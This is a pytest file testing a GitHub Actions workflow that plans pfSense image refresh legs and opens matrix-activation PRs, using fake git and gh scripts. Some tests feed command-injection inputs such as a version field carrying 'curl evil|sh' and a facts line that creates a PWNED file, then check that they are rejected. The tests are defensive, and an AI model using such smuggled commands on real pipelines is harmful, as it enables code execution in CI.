"""image-refresh.yml plan-job contract (issue #1823).

Runs the REAL 'Build refresh matrix from ci-metadata' step script (extracted
from the workflow YAML, executed with a fake `git` serving a fixture matrix)
and asserts the emitted strategy matrix:

  - a bare dispatch plans NOTHING (the upgrade.available matrix mode is
    retired — the reconcile loop decides what runs);
  - DIRECT_LEG passes one validated leg through verbatim (including its exact
    php_version/py_flavor tuple, charset-constrained) and wins over self_refresh;
  - SELF_REFRESH=true emits from==to `--force` legs for the newest amd64 entry
    per channel (manual operator re-publish);
  - route-only and aarch64 entries never produce a leg (no ARM smoke image).
"""

from __future__ import annotations

import json
import os
import subprocess
from pathlib import Path
from typing import Any

from tests._workflow_steps import extract_after, extract_between

ROOT = Path(__file__).resolve().parents[1]
WORKFLOW = ROOT / ".github" / "workflows" / "image-refresh.yml"
STEP_NAME = "Build refresh matrix from ci-metadata"


def _entry(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "pfsense_version": "2.8",
        "channel": "CE",
        "freebsd_version": "15.0-RELEASE",
        "freebsd_major": "15",
        "php_version": "8.3",
        "py_flavor": "py311",
        "variant": "CE",
        "status": "active",
        "ci": True,
        "upgrade": {"available": False},
    }
    base.update(overrides)
    return base


def _run_plan(
    tmp_path: Path,
    versions: list[dict[str, Any]],
    *,
    filter_version: str = "",
    self_refresh: str = "",
    direct_leg: str = "",
) -> dict[str, Any]:
    """Extract the plan step's run script and execute it against a fixture."""
    source = WORKFLOW.read_text(encoding="utf-8")
    step = extract_between(source, f"      - name: {STEP_NAME}\n", "\n      - name:")
    # The run-block body is every ≥10-space-indented line after `run: |`; the
    # first shallower line ends it, because a step boundary alone can leak a later
    # job's YAML in (the terminator matches the next `- name:` anywhere below).
    body: list[str] = []
    for line in extract_after(step, "        run: |\n").splitlines():
        if not line.strip():
            body.append("")
        elif line.startswith("          "):
            body.append(line[10:])
        else:
            break
    script = "\n".join(body)

    matrix_file = tmp_path / "matrix.json"
    matrix_file.write_text(json.dumps({"versions": versions}), encoding="utf-8")
    fake_git = tmp_path / "git"
    fake_git.write_text(
        """#!/bin/sh
case "$1" in
  fetch) exit 0 ;;
  show)  cat "$FAKE_MATRIX" ;;
esac
""",
        encoding="utf-8",
    )
    fake_git.chmod(0o755)
    out_file = tmp_path / "gh-output"
    out_file.write_text("", encoding="utf-8")

    env = os.environ | {
        "PATH": f"{tmp_path}:{os.environ['PATH']}",
        "FAKE_MATRIX": str(matrix_file),
        "FILTER_VERSION": filter_version,
        "SELF_REFRESH": self_refresh,
        "DIRECT_LEG": direct_leg,
        "GITHUB_OUTPUT": str(out_file),
    }
    subprocess.run(["bash", "-c", script], cwd=tmp_path, env=env, check=True, capture_output=True, text=True)

    outputs: dict[str, str] = {}
    for line in out_file.read_text(encoding="utf-8").splitlines():
        key, _, value = line.partition("=")
        outputs[key] = value
    matrix = json.loads(outputs["matrix"])
    assert json.loads(outputs["count"]) == len(matrix["include"])
    return matrix


class TestBareDispatch:
    """Scenario (issue #1823): the retired upgrade.available matrix mode plans
    NOTHING — legs come only from a direct_leg dispatch (the reconcile loop) or
    an explicit self_refresh run."""

    def test_bare_dispatch_plans_no_legs_even_with_available_flags(self, tmp_path: Path) -> None:
        versions = [
            _entry(upgrade={"available": True}),
            _entry(
                pfsense_version="26.07",
                channel="Plus",
                variant="Plus",
                status="beta",
                ci=False,
                image_name="pfsense-plus",
                upgrade={"available": True, "from": "26.03", "branch": "26.07"},
            ),
        ]
        matrix = _run_plan(tmp_path, versions)
        assert matrix["include"] == []


class TestDirectLeg:
    """Scenario (issue #1823): the reconcile loop dispatches one fully-specified
    leg as JSON; the plan validates and passes it through verbatim."""

    LEG = {
        "variant": "plus",
        "label": "Plus",
        "pfsense_version": "26.07",
        "freebsd_version": "16.0-RELEASE",
        "php_version": "8.5",
        "py_flavor": "py311",
        "image_name": "pfsense-plus",
        "branch": "26.07",
        "target": "26.07",
        "from": "26.03",
        "force_flag": "",
    }

    def test_valid_direct_leg_passes_through(self, tmp_path: Path) -> None:
        matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(self.LEG))
        assert matrix["include"] == [self.LEG]

    def test_direct_leg_overrides_self_refresh(self, tmp_path: Path) -> None:
        # A dispatch carrying both inputs is a caller bug; direct wins (explicit
        # beats derived) and exactly one leg runs
        matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(self.LEG), self_refresh="true")
        assert matrix["include"] == [self.LEG]

    def test_garbage_direct_leg_plans_nothing(self, tmp_path: Path) -> None:
        matrix = _run_plan(tmp_path, [_entry()], direct_leg="not json {")
        assert matrix["include"] == []

    def test_incomplete_direct_leg_plans_nothing(self, tmp_path: Path) -> None:
        # Missing required fields (e.g. image_name) must not produce a leg
        leg = {k: v for k, v in self.LEG.items() if k != "image_name"}
        matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(leg))
        assert matrix["include"] == []

    def test_runtime_tuple_fields_are_required(self, tmp_path: Path) -> None:
        for key in ("php_version", "py_flavor"):
            leg = {k: v for k, v in self.LEG.items() if k != key}
            matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(leg))
            assert matrix["include"] == [], f"a direct_leg missing {key} must be rejected"

    def test_runtime_tuple_fields_are_charset_constrained(self, tmp_path: Path) -> None:
        for key, value in (("php_version", "8.5;curl-evil"), ("py_flavor", "py311;curl-evil")):
            matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(dict(self.LEG, **{key: value})))
            assert matrix["include"] == [], f"a direct_leg with hostile {key} must be rejected"

    def test_metacharacter_leg_values_are_rejected(self, tmp_path: Path) -> None:
        # Review F4 hardening: leg fields reach ${{ matrix.* }} interpolation in
        # the refresh job's run bodies — shell metacharacters never pass
        leg = dict(self.LEG, pfsense_version='26.07"; curl evil|sh; "')
        matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(leg))
        assert matrix["include"] == []

    def test_force_flag_must_be_empty_or_force(self, tmp_path: Path) -> None:
        leg = dict(self.LEG, force_flag="--rm-everything")
        matrix = _run_plan(tmp_path, [_entry()], direct_leg=json.dumps(leg))
        assert matrix["include"] == []


class TestSelfRefreshLegs:
    """Scenario: SELF_REFRESH=true → newest amd64 entry per channel gets a
    from==to --force leg (same floating tag re-publish), upgrade.available ignored."""

    def test_self_refresh_emits_from_equals_to_force_leg(self, tmp_path: Path) -> None:
        versions = [
            _entry(
                pfsense_version="26.03",
                channel="Plus",
                variant="Plus",
                image_name="pfsense-plus",
                upgrade={"available": False},
            )
        ]
        matrix = _run_plan(tmp_path, versions, filter_version="26.03", self_refresh="true")
        assert len(matrix["include"]) == 1
        leg = matrix["include"][0]
        assert leg["pfsense_version"] == "26.03"
        assert leg["from"] == "26.03"
        assert leg["target"] == "26.03"
        assert leg["branch"] == ""
        assert leg["force_flag"] == "--force"
        assert leg["image_name"] == "pfsense-plus"
        # issue #2926: the leg carries the row's exact runtime tuple so the
        # non-blocking smoke step can hand it to install-from-repo.sh.
        assert leg["php_version"] == "8.3"
        assert leg["py_flavor"] == "py311"

    def test_self_refresh_without_filter_picks_latest_per_channel(self, tmp_path: Path) -> None:
        versions = [
            _entry(upgrade={"available": False}),  # CE 2.8
            _entry(pfsense_version="2.7", upgrade={"available": False}),
            _entry(
                pfsense_version="26.03",
                channel="Plus",
                variant="Plus",
                image_name="pfsense-plus",
                upgrade={"available": False},
            ),
            _entry(
                pfsense_version="26.07",
                channel="Plus",
                variant="Plus",
                status="beta",
                ci=False,
                image_name="pfsense-plus",
                upgrade={"available": False},
            ),
        ]
        matrix = _run_plan(tmp_path, versions, self_refresh="true")
        legs = {leg["variant"]: leg["pfsense_version"] for leg in matrix["include"]}
        assert legs == {"ce": "2.8", "plus": "26.07"}

    def test_self_refresh_skips_aarch64_duplicate(self, tmp_path: Path) -> None:
        versions = [
            _entry(
                pfsense_version="26.03",
                channel="Plus",
                variant="Plus",
                image_name="pfsense-plus",
                upgrade={"available": False},
            ),
            _entry(
                pfsense_version="26.03",
                channel="Plus",
                variant="Plus",
                ci=False,
                arch="aarch64",
                image_name="pfsense-plus",
                upgrade={"available": False},
            ),
        ]
        matrix = _run_plan(tmp_path, versions, self_refresh="true")
        assert len(matrix["include"]) == 1
        assert matrix["include"][0]["pfsense_version"] == "26.03"


ACTIVATION_STEP = "Open activation PR (box-verified matrix update)"

FAKE_GIT_ACT = """#!/bin/sh
printf 'git %s\\n' "$*" >> "$GIT_LOG"
case "$1" in
  show) cat "$FAKE_MATRIX" ;;
  checkout)
    # Emulate the real effect: switching the JOB's tree to the ci-metadata
    # orphan ref leaves only the matrix file behind (CodeRabbit CR2).
    rm -rf scripts
    ;;
  worktree)
    # `worktree add [--force] [-B BR] DIR REF` materialises the ref in DIR and
    # leaves the JOB's tree untouched. Mirror it into a predictable wt-* dir so
    # the assertions can read what the step staged.
    shift
    [ "$1" = "add" ] && shift
    _dir=""
    while [ "$#" -gt 0 ]; do
      case "$1" in
        --force) shift ;;
        -B) shift 2 ;;
        *) [ -z "$_dir" ] && _dir=$1; shift ;;
      esac
    done
    if [ -n "$_dir" ] && [ "$_dir" != "remove" ]; then
      mkdir -p "$_dir"
      printf 'WT %s\\n' "$_dir" >> "$GIT_LOG"
      ln -s "$_dir" "wt-$$" 2>/dev/null || true
    fi
    ;;
esac
exit 0
"""

FAKE_GH_ACT = """#!/bin/sh
case "$*" in
  "pr list "*) printf '%s\\n' "${GH_PR_OPEN:-}" ;;
  "pr create "*) printf 'pr create %s\\n' "$*" >> "$GH_LOG" ;;
esac
exit 0
"""

PLUS_2607_MATRIX = {
    "versions": [
        {
            "pfsense_version": "26.03",
            "channel": "Plus",
            "freebsd_version": "16.0-RELEASE",
            "freebsd_major": "16",
            "php_version": "8.5",
            "py_flavor": "py311",
            "variant": "Plus",
            "status": "active",
            "ci": True,
            "image_name": "pfsense-plus",
        },
        {
            "pfsense_version": "26.07",
            "channel": "Plus",
            "freebsd_version": "16.0-RELEASE",
            "freebsd_major": "16",
            "php_version": "8.5",
            "py_flavor": "py311",
            "variant": "Plus",
            "status": "beta",
            "ci": False,
            "image_name": "pfsense-plus",
        },
    ]
}

FACTS_857 = "etc_version=26.07-BETA\nphp_version=8.6\npy_flavor=py312\nfreebsd_version=16.0-CURRENT\nfreebsd_major=16\n"


def _pushed_matrix(tmp_path: Path) -> dict[str, Any]:
    """The matrix the step staged for the PR branch (written in its worktree)."""
    staged = sorted(tmp_path.glob("wt-*/supported-versions.json"))
    assert staged, "the activation step staged no matrix file"
    return json.loads(staged[0].read_text(encoding="utf-8"))


class TestActivationPr:
    """Scenario (issue #1837): after a publish, the leg's matrix entry is
    activated (ci: true) with the box-verified php/py versions, via ONE
    tracker/* PR. A FreeBSD major mismatch between the guest and the matrix
    row refuses to activate (::error:: + exit 1, no write) instead of
    rewriting freebsd_version/freebsd_major; either side being unrecorded
    warns without blocking the activation (issue #2242)."""

    _last_proc: subprocess.CompletedProcess[str] | None = None

    def _run(
        self,
        tmp_path: Path,
        *,
        facts: str | None,
        matrix: dict[str, Any] | None = None,
        family: str = "26.07",
        pr_open: str = "",
        dry_run: str = "false",
        expect_failure: bool = False,
    ) -> tuple[str, str, Path]:
        source = WORKFLOW.read_text(encoding="utf-8")
        step = extract_between(source, f"      - name: {ACTIVATION_STEP}\n", "\n      - name:")
        body: list[str] = []
        for line in extract_after(step, "        run: |\n").splitlines():
            if not line.strip():
                body.append("")
            elif line.startswith("          "):
                body.append(line[10:])
            else:
                break
        script = "\n".join(body)

        for name, content in (("git", FAKE_GIT_ACT), ("gh", FAKE_GH_ACT)):
            fake = tmp_path / name
            fake.write_text(content, encoding="utf-8")
            fake.chmod(0o755)
        matrix_file = tmp_path / "fake-matrix.json"
        matrix_file.write_text(json.dumps(matrix or PLUS_2607_MATRIX), encoding="utf-8")
        if facts is not None:
            (tmp_path / "box-facts.env").write_text(facts, encoding="utf-8")

        env = os.environ | {
            "PATH": f"{tmp_path}:{os.environ['PATH']}",
            "GIT_LOG": str(tmp_path / "git.log"),
            "GH_LOG": str(tmp_path / "gh.log"),
            "GH_PR_OPEN": pr_open,
            "FAKE_MATRIX": str(matrix_file),
            "REPO": "owner/repo",
            "CHANNEL": "Plus",
            "FAMILY": family,
            "VARIANT": "plus",
            "DRY_RUN": dry_run,
        }
        proc = subprocess.run(
            ["bash", "-c", script], cwd=tmp_path, env=env, check=not expect_failure, capture_output=True, text=True
        )
        self._last_proc = proc

        def log(name: str) -> str:
            f = tmp_path / name
            return f.read_text(encoding="utf-8") if f.exists() else ""

        return log("git.log"), log("gh.log"), tmp_path

    def test_publish_activates_entry_with_box_facts(self, tmp_path: Path) -> None:
        git_log, gh_log, cwd = self._run(tmp_path, facts=FACTS_857)
        assert "--force origin tracker/matrix-activate-plus-26.07" in git_log
        assert "pr create" in gh_log
        entry = next(e for e in _pushed_matrix(cwd)["versions"] if e["pfsense_version"] == "26.07")
        assert entry["ci"] is True
        assert entry["php_version"] == "8.6"
        assert entry["py_flavor"] == "py312"
        # major unchanged (16) -> the human freebsd_version convention survives
        assert entry["freebsd_version"] == "16.0-RELEASE"

    def test_major_mismatch_refuses_to_activate(self, tmp_path: Path) -> None:
        """issue #2242: a guest-reported FreeBSD major that disagrees with the
        matrix row is a broken guest, not new truth — hard stop, no write."""
        facts = FACTS_857.replace("16.0-CURRENT", "17.0-CURRENT").replace("freebsd_major=16", "freebsd_major=17")
        git_log, gh_log, _ = self._run(tmp_path, facts=facts, expect_failure=True)
        proc = self._last_proc
        assert proc is not None
        assert proc.returncode != 0
        assert "::error::" in proc.stdout
        assert "17" in proc.stdout
        assert "16" in proc.stdout
        assert "push" not in git_log
        assert "pr create" not in gh_log

    def test_missing_matrix_freebsd_major_warns_and_proceeds(self, tmp_path: Path) -> None:
        """issue #2242 C7: an empty side of the major comparison must not go silent —
        the step warns naming the missing side, but still activates (unlike a real
        mismatch, which hard-stops)."""
        matrix = json.loads(json.dumps(PLUS_2607_MATRIX))
        del matrix["versions"][1]["freebsd_major"]
        facts = FACTS_857.replace("freebsd_major=16", "freebsd_major=17")
        git_log, gh_log, cwd = self._run(tmp_path, facts=facts, matrix=matrix)
        proc = self._last_proc
        assert proc is not None
        assert proc.returncode == 0
        assert "::warning::" in proc.stdout
        assert "17" in proc.stdout
        assert "--force origin tracker/matrix-activate-plus-26.07" in git_log
        assert "pr create" in gh_log

    def test_missing_guest_freebsd_major_warns_and_proceeds(self, tmp_path: Path) -> None:
        """issue #2242 C7: the guest side can also be empty (a facts probe that
        never resolved it) — same warn-and-proceed contract."""
        facts = FACTS_857.replace("freebsd_major=16\n", "")
        git_log, gh_log, _ = self._run(tmp_path, facts=facts)
        proc = self._last_proc
        assert proc is not None
        assert proc.returncode == 0
        assert "::warning::" in proc.stdout
        assert "16" in proc.stdout
        assert "--force origin tracker/matrix-activate-plus-26.07" in git_log
        assert "pr create" in gh_log

    def test_active_and_accurate_entry_does_nothing(self, tmp_path: Path) -> None:
        facts = (
            "etc_version=26.03.1-RELEASE\nphp_version=8.5\npy_flavor=py311\n"
            "freebsd_version=16.0-CURRENT\nfreebsd_major=16\n"
        )
        git_log, gh_log, _ = self._run(tmp_path, facts=facts, family="26.03")
        assert "push" not in git_log
        assert "pr create" not in gh_log

    def test_missing_facts_skip_everything(self, tmp_path: Path) -> None:
        git_log, gh_log, _ = self._run(tmp_path, facts=None)
        assert git_log == ""
        assert gh_log == ""

    def test_existing_open_pr_updates_without_recreating(self, tmp_path: Path) -> None:
        git_log, gh_log, _ = self._run(tmp_path, facts=FACTS_857, pr_open="88")
        assert "--force origin tracker/matrix-activate-plus-26.07" in git_log
        assert "pr create" not in gh_log

    def test_dry_run_proposes_nothing(self, tmp_path: Path) -> None:
        # Review B2: issue #1837 requires DRY_RUN honored, like the reconcile's
        # own open_matrix_pr
        git_log, gh_log, _ = self._run(tmp_path, facts=FACTS_857, dry_run="true")
        assert "push" not in git_log
        assert "pr create" not in gh_log

    def test_hostile_facts_file_is_not_executed(self, tmp_path: Path) -> None:
        # Review B1: the step must not source the facts file — a stray line
        # (anomalous /etc/version, or an injected one) must never run
        facts = FACTS_857 + f"touch {tmp_path}/PWNED\n"
        self._run(tmp_path, facts=facts)
        assert not (tmp_path / "PWNED").exists()

    def test_aarch64_twin_entry_is_left_untouched(self, tmp_path: Path) -> None:
        matrix = json.loads(json.dumps(PLUS_2607_MATRIX))
        twin = dict(matrix["versions"][1], arch="aarch64", ci=False)
        matrix["versions"].append(twin)
        _, _, cwd = self._run(tmp_path, facts=FACTS_857, matrix=matrix)
        versions = _pushed_matrix(cwd)["versions"]
        amd = next(e for e in versions if e["pfsense_version"] == "26.07" and e.get("arch", "amd64") == "amd64")
        arm = next(e for e in versions if e.get("arch") == "aarch64")
        assert amd["ci"] is True
        assert amd["php_version"] == "8.6"
        # the ARM twin has no smoke image — it must keep ci:false and its values
        assert arm["ci"] is False
        assert arm["php_version"] == "8.5"

    def test_working_tree_survives_the_activation_step(self, tmp_path: Path) -> None:
        # CodeRabbit CR2 (critical): the non-blocking smoke step runs AFTER this
        # one and needs scripts/ — the PR branch work must not swap the job's
        # working tree to the ci-metadata ref.
        (tmp_path / "scripts").mkdir()
        (tmp_path / "scripts" / "install-from-repo.sh").write_text("#!/bin/sh\n", encoding="utf-8")
        self._run(tmp_path, facts=FACTS_857)
        assert (tmp_path / "scripts" / "install-from-repo.sh").exists()
